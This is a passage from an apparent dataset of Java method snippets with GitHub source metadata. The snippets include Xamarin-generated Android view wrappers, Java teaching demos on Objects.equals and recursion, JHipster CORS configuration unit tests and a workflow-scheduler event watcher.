p3);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellSearchView.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32733, "method_name": "onTextChanged", "class_name": "ShellSearchView", "params": ["java", "int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onTextChanged (java.lang.CharSequence p0, int p1, int p2, int p3)\n\t{\n\t\tn_onTextChanged (p0, p1, p2, p3);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellSearchView.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32734, "method_name": "n_onTextChanged", "class_name": "ShellSearchView", "params": ["java", "int", "int", "int"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onTextChanged (java.lang.CharSequence p0, int p1, int p2, int p3);\n\n\tprivate java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellSearchView.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32735, "method_name": "monodroidAddReference", "class_name": "ShellSearchView", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellSearchView.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32736, "method_name": "monodroidClearReferences", "class_name": "ShellSearchView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellSearchView.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32737, "method_name": "main", "class_name": "Demo03Objects", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        String s1 = \"abc\";\n        //String s1 = null;\n        String s2 = \"abc\";\n        //boolean b = s1.equals(s2); // NullPointerException null\u662f\u4e0d\u80fd\u8c03\u7528\u65b9\u6cd5\u7684,\u4f1a\u629b\u51fa\u7a7a\u6307\u9488\u5f02\u5e38\n        //System.out.println(b);\n        /*\n            Objects\u7c7b\u7684equals\u65b9\u6cd5:\u5bf9\u4e24\u4e2a\u5bf9\u8c61\u8fdb\u884c\u6bd4\u8f83,\u9632\u6b62\u7a7a\u6307\u9488\u5f02\u5e38\n            public static boolean equals(Object a, Object b) {\n                return (a == b) || (a != null && a.equals(b));\n            }\n         */\n        boolean b2 = Objects.equals(s1, s2);\n        System.out.println(b2);\n\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/12.%E3%80%90Object%E7%B1%BB%E3%80%81%E5%B8%B8%E7%94%A8API%E3%80%91-%E7%AC%94%E8%AE%B0/code/01_API/src/com/itheima/demo01/Object/Demo03Objects.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32738, "method_name": "setup", "class_name": "WebConfigurerTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setup() {\n        servletContext = spy(new MockServletContext());\n        doReturn(mock(FilterRegistration.Dynamic.class))\n            .when(servletContext).addFilter(anyString(), any(Filter.class));\n        doReturn(mock(ServletRegistration.Dynamic.class))\n            .when(servletContext).addServlet(anyString(), any(Servlet.class));\n\n        env = new MockEnvironment();\n        props = new JHipsterProperties();\n\n        webConfigurer = new WebConfigurer(env, props);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/config/WebConfigurerTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32739, "method_name": "testStartUpProdServletContext", "class_name": "WebConfigurerTest", "params": [], "throws": ["ServletException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testStartUpProdServletContext() throws ServletException {\n        env.setActiveProfiles(JHipsterConstants.SPRING_PROFILE_PRODUCTION);\n        webConfigurer.onStartup(servletContext);\n\n        verify(servletContext).addFilter(eq(\"cachingHttpHeadersFilter\"), any(CachingHttpHeadersFilter.class));\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/config/WebConfigurerTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32740, "method_name": "testStartUpDevServletContext", "class_name": "WebConfigurerTest", "params": [], "throws": ["ServletException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testStartUpDevServletContext() throws ServletException {\n        env.setActiveProfiles(JHipsterConstants.SPRING_PROFILE_DEVELOPMENT);\n        webConfigurer.onStartup(servletContext);\n\n        verify(servletContext, never()).addFilter(eq(\"cachingHttpHeadersFilter\"), any(CachingHttpHeadersFilter.class));\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/config/WebConfigurerTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32741, "method_name": "testCustomizeServletContainer", "class_name": "WebConfigurerTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testCustomizeServletContainer() {\n        env.setActiveProfiles(JHipsterConstants.SPRING_PROFILE_PRODUCTION);\n        UndertowServletWebServerFactory container = new UndertowServletWebServerFactory();\n        webConfigurer.customize(container);\n        assertThat(container.getMimeMappings().get(\"abs\")).isEqualTo(\"audio/x-mpeg\");\n        assertThat(container.getMimeMappings().get(\"html\")).isEqualTo(\"text/html;charset=utf-8\");\n        assertThat(container.getMimeMappings().get(\"json\")).isEqualTo(\"text/html;charset=utf-8\");\n        if (container.getDocumentRoot() != null) {\n            assertThat(container.getDocumentRoot()).isEqualTo(new File(\"target/classes/static/\"));\n        }\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/config/WebConfigurerTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32742, "method_name": "testCorsFilterOnApiPath", "class_name": "WebConfigurerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testCorsFilterOnApiPath() throws Exception {\n        props.getCors().setAllowedOrigins(Collections.singletonList(\"*\"));\n        props.getCors().setAllowedMethods(Arrays.asList(\"GET\", \"POST\", \"PUT\", \"DELETE\"));\n        props.getCors().setAllowedHeaders(Collections.singletonList(\"*\"));\n        props.getCors().setMaxAge(1800L);\n        props.getCors().setAllowCredentials(true);\n\n        MockMvc mockMvc = MockMvcBuilders.standaloneSetup(new WebConfigurerTestController())\n            .addFilters(webConfigurer.corsFilter())\n            .build();\n\n        mockMvc.perform(\n            options(\"/api/v1/test-cors\")\n                .header(HttpHeaders.ORIGIN, \"other.domain.com\")\n                .header(HttpHeaders.ACCESS_CONTROL_REQUEST_METHOD, \"POST\"))\n            .andExpect(status().isOk())\n            .andExpect(header().string(HttpHeaders.ACCESS_CONTROL_ALLOW_ORIGIN, \"other.domain.com\"))\n            .andExpect(header().string(HttpHeaders.VARY, \"Origin\"))\n            .andExpect(header().string(HttpHeaders.ACCESS_CONTROL_ALLOW_METHODS, \"GET,POST,PUT,DELETE\"))\n            .andExpect(header().string(HttpHeaders.ACCESS_CONTROL_ALLOW_CREDENTIALS, \"true\"))\n            .andExpect(header().string(HttpHeaders.ACCESS_CONTROL_MAX_AGE, \"1800\"));\n\n        mockMvc.perform(\n            get(\"/api/v1/test-cors\")\n                .header(HttpHeaders.ORIGIN, \"other.domain.com\"))\n            .andExpect(status().isOk())\n            .andExpect(header().string(HttpHeaders.ACCESS_CONTROL_ALLOW_ORIGIN, \"other.domain.com\"));\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/config/WebConfigurerTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32743, "method_name": "testCorsFilterOnOtherPath", "class_name": "WebConfigurerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testCorsFilterOnOtherPath() throws Exception {\n        props.getCors().setAllowedOrigins(Collections.singletonList(\"*\"));\n        props.getCors().setAllowedMethods(Arrays.asList(\"GET\", \"POST\", \"PUT\", \"DELETE\"));\n        props.getCors().setAllowedHeaders(Collections.singletonList(\"*\"));\n        props.getCors().setMaxAge(1800L);\n        props.getCors().setAllowCredentials(true);\n\n        MockMvc mockMvc = MockMvcBuilders.standaloneSetup(new WebConfigurerTestController())\n            .addFilters(webConfigurer.corsFilter())\n            .build();\n\n        mockMvc.perform(\n            get(\"/test/test-cors\")\n                .header(HttpHeaders.ORIGIN, \"other.domain.com\"))\n            .andExpect(status().isOk())\n            .andExpect(header().doesNotExist(HttpHeaders.ACCESS_CONTROL_ALLOW_ORIGIN));\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/config/WebConfigurerTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32744, "method_name": "testCorsFilterDeactivated", "class_name": "WebConfigurerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testCorsFilterDeactivated() throws Exception {\n        props.getCors().setAllowedOrigins(null);\n\n        MockMvc mockMvc = MockMvcBuilders.standaloneSetup(new WebConfigurerTestController())\n            .addFilters(webConfigurer.corsFilter())\n            .build();\n\n        mockMvc.perform(\n            get(\"/api/v1/test-cors\")\n                .header(HttpHeaders.ORIGIN, \"other.domain.com\"))\n            .andExpect(status().isOk())\n            .andExpect(header().doesNotExist(HttpHeaders.ACCESS_CONTROL_ALLOW_ORIGIN));\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/config/WebConfigurerTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32745, "method_name": "testCorsFilterDeactivated2", "class_name": "WebConfigurerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testCorsFilterDeactivated2() throws Exception {\n        props.getCors().setAllowedOrigins(new ArrayList<>());\n\n        MockMvc mockMvc = MockMvcBuilders.standaloneSetup(new WebConfigurerTestController())\n            .addFilters(webConfigurer.corsFilter())\n            .build();\n\n        mockMvc.perform(\n            get(\"/api/v1/test-cors\")\n                .header(HttpHeaders.ORIGIN, \"other.domain.com\"))\n            .andExpect(status().isOk())\n            .andExpect(header().doesNotExist(HttpHeaders.ACCESS_CONTROL_ALLOW_ORIGIN));\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/config/WebConfigurerTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32746, "method_name": "onMeasure", "class_name": "SquareCardView", "params": ["int", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {\n        super.onMeasure(SquareDelegate.measureWidth(widthMeasureSpec, heightMeasureSpec),\n                SquareDelegate.measureHeight(widthMeasureSpec, heightMeasureSpec));\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/widget/src/main/java/com/hjq/widget/square/SquareCardView.java", "stars": "1", "class_props": {"extends": "CardView", "implements": null, "modifiers": ["final", "public"]}}, {"id": 32747, "method_name": "onLayout", "class_name": "SwipeViewRenderer", "params": ["boolean", "int", "int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onLayout (boolean p0, int p1, int p2, int p3, int p4)\n\t{\n\t\tn_onLayout (p0, p1, p2, p3, p4);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SwipeViewRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 32748, "method_name": "n_onLayout", "class_name": "SwipeViewRenderer", "params": ["boolean", "int", "int", "int", "int"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onLayout (boolean p0, int p1, int p2, int p3, int p4);\n\n\n\tpublic void onAttachedToWindow ()\n\t{\n\t\tn_onAttachedToWindow ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SwipeViewRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 32749, "method_name": "onAttachedToWindow", "class_name": "SwipeViewRenderer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onAttachedToWindow ()\n\t{\n\t\tn_onAttachedToWindow ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SwipeViewRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 32750, "method_name": "n_onAttachedToWindow", "class_name": "SwipeViewRenderer", "params": [], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onAttachedToWindow ();\n\n\n\tpublic boolean onTouchEvent (android.view.MotionEvent p0)\n\t{\n\t\treturn n_onTouchEvent (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SwipeViewRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 32751, "method_name": "onTouchEvent", "class_name": "SwipeViewRenderer", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onTouchEvent (android.view.MotionEvent p0)\n\t{\n\t\treturn n_onTouchEvent (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SwipeViewRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 32752, "method_name": "n_onTouchEvent", "class_name": "SwipeViewRenderer", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onTouchEvent (android.view.MotionEvent p0);\n\n\n\tpublic boolean onInterceptTouchEvent (android.view.MotionEvent p0)\n\t{\n\t\treturn n_onInterceptTouchEvent (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SwipeViewRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 32753, "method_name": "onInterceptTouchEvent", "class_name": "SwipeViewRenderer", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onInterceptTouchEvent (android.view.MotionEvent p0)\n\t{\n\t\treturn n_onInterceptTouchEvent (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SwipeViewRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 32754, "method_name": "n_onInterceptTouchEvent", "class_name": "SwipeViewRenderer", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onInterceptTouchEvent (android.view.MotionEvent p0);\n\n\n\tpublic boolean onDown (android.view.MotionEvent p0)\n\t{\n\t\treturn n_onDown (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SwipeViewRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 32755, "method_name": "onDown", "class_name": "SwipeViewRenderer", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onDown (android.view.MotionEvent p0)\n\t{\n\t\treturn n_onDown (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SwipeViewRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 32756, "method_name": "n_onDown", "class_name": "SwipeViewRenderer", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onDown (android.view.MotionEvent p0);\n\n\n\tpublic boolean onFling (android.view.MotionEvent p0, android.view.MotionEvent p1, float p2, float p3)\n\t{\n\t\treturn n_onFling (p0, p1, p2, p3);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SwipeViewRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 32757, "method_name": "onFling", "class_name": "SwipeViewRenderer", "params": ["android", "android", "float", "float"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onFling (android.view.MotionEvent p0, android.view.MotionEvent p1, float p2, float p3)\n\t{\n\t\treturn n_onFling (p0, p1, p2, p3);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SwipeViewRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 32758, "method_name": "n_onFling", "class_name": "SwipeViewRenderer", "params": ["android", "android", "float", "float"], "throws": null, "modifiers": ["private", "native"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onFling (android.view.MotionEvent p0, android.view.MotionEvent p1, float p2, float p3);\n\n\n\tpublic void onLongPress (android.view.MotionEvent p0)\n\t{\n\t\tn_onLongPress (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SwipeViewRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 32759, "method_name": "onLongPress", "class_name": "SwipeViewRenderer", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onLongPress (android.view.MotionEvent p0)\n\t{\n\t\tn_onLongPress (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SwipeViewRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 32760, "method_name": "n_onLongPress", "class_name": "SwipeViewRenderer", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onLongPress (android.view.MotionEvent p0);\n\n\n\tpublic boolean onScroll (android.view.MotionEvent p0, android.view.MotionEvent p1, float p2, float p3)\n\t{\n\t\treturn n_onScroll (p0, p1, p2, p3);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SwipeViewRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 32761, "method_name": "onScroll", "class_name": "SwipeViewRenderer", "params": ["android", "android", "float", "float"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onScroll (android.view.MotionEvent p0, android.view.MotionEvent p1, float p2, float p3)\n\t{\n\t\treturn n_onScroll (p0, p1, p2, p3);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SwipeViewRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 32762, "method_name": "n_onScroll", "class_name": "SwipeViewRenderer", "params": ["android", "android", "float", "float"], "throws": null, "modifiers": ["private", "native"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onScroll (android.view.MotionEvent p0, android.view.MotionEvent p1, float p2, float p3);\n\n\n\tpublic void onShowPress (android.view.MotionEvent p0)\n\t{\n\t\tn_onShowPress (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SwipeViewRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 32763, "method_name": "onShowPress", "class_name": "SwipeViewRenderer", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onShowPress (android.view.MotionEvent p0)\n\t{\n\t\tn_onShowPress (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SwipeViewRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 32764, "method_name": "n_onShowPress", "class_name": "SwipeViewRenderer", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onShowPress (android.view.MotionEvent p0);\n\n\n\tpublic boolean onSingleTapUp (android.view.MotionEvent p0)\n\t{\n\t\treturn n_onSingleTapUp (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SwipeViewRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 32765, "method_name": "onSingleTapUp", "class_name": "SwipeViewRenderer", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onSingleTapUp (android.view.MotionEvent p0)\n\t{\n\t\treturn n_onSingleTapUp (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SwipeViewRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 32766, "method_name": "n_onSingleTapUp", "class_name": "SwipeViewRenderer", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onSingleTapUp (android.view.MotionEvent p0);\n\n\tprivate java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SwipeViewRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 32767, "method_name": "monodroidAddReference", "class_name": "SwipeViewRenderer", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SwipeViewRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 32768, "method_name": "monodroidClearReferences", "class_name": "SwipeViewRenderer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SwipeViewRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 32769, "method_name": "main", "class_name": "Demo01Recurison", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        //a();\n        b(1);\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/19.%E3%80%90File%E7%B1%BB%E3%80%81%E9%80%92%E5%BD%92%E3%80%91-%E7%AC%94%E8%AE%B0/code/08_FileAndRecursion/src/com/itheima/demo02/Recursion/Demo01Recurison.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32770, "method_name": "b", "class_name": "Demo01Recurison", "params": ["int"], "throws": null, "modifiers": ["private", "static"], "return_type": "void", "snippet": "    private static void b(int i) {\n        System.out.println(i);\n        if(i==20000){\n            return; //\u7ed3\u675f\u65b9\u6cd5\n        }\n        b(++i);\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/19.%E3%80%90File%E7%B1%BB%E3%80%81%E9%80%92%E5%BD%92%E3%80%91-%E7%AC%94%E8%AE%B0/code/08_FileAndRecursion/src/com/itheima/demo02/Recursion/Demo01Recurison.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32771, "method_name": "a", "class_name": "Demo01Recurison", "params": [], "throws": null, "modifiers": ["private", "static"], "return_type": "void", "snippet": "    private static void a() {\n        System.out.println(\"a\u65b9\u6cd5!\");\n        a();\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/19.%E3%80%90File%E7%B1%BB%E3%80%81%E9%80%92%E5%BD%92%E3%80%91-%E7%AC%94%E8%AE%B0/code/08_FileAndRecursion/src/com/itheima/demo02/Recursion/Demo01Recurison.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32772, "method_name": "stopWatcher", "class_name": "LocalFlowWatcher", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void stopWatcher() {\n    // Just freeing stuff\n    if (this.isShutdown) {\n      return;\n    }\n\n    this.isShutdown = true;\n    this.runner.removeListener(this.watcherListener);\n    this.runner = null;\n\n    getLogger().info(\"Stopping watcher, and unblocking pipeline\");\n    super.unblockAllWatches();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/LocalFlowWatcher.java", "stars": "18", "class_props": {"extends": "FlowWatcher", "implements": null, "modifiers": ["public"]}}, {"id": 32773, "method_name": "handleEvent", "class_name": "LocalFlowWatcherListener", "params": ["Event"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void handleEvent(final Event event) {\n      if (event.getType() == EventType.JOB_FINISHED) {\n        if (event.getRunner() instanceof FlowRunner) {\n          // The flow runner will finish a job without it running\n          final EventData eventData = event.getData();\n          if (eventData.getNestedId() != null) {\n            handleJobStatusChange(eventData.getNestedId(), eventData.getStatus());\n          }\n        } else if (event.getRunner() instanceof JobRunner) {\n          // A job runner is finished\n          final JobRunner runner = (JobRunner) event.getRunner();\n          final ExecutableNode node = runner.getNode();\n          getLogger().info(node + \" looks like \" + node.getStatus());\n          handleJobStatusChange(node.getNestedId(), node.getStatus());\n        }\n      } else if (event.getType() == EventType.FLOW_FINISHED) {\n        stopWatcher();\n      }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/LocalFlowWatcher.java", "stars": 